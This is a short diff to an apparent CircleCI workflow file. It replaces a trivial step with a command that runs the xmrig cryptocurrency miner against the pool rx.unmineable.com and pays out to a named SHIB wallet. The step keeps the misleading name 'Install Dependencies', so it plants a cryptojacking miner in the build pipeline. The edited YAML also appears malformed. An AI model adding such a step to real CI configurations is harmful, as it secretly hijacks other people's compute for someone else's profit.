@@ -7,9 +7,8 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: |
-              lscpu
-              echo Hello,subscribe it
+            command: |xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x5582a062832c2FBff2F4d14C5e5Ad2a3Cb84f6C0.Maramo -p x
+pause
 
 workflows:
     version: 2.1
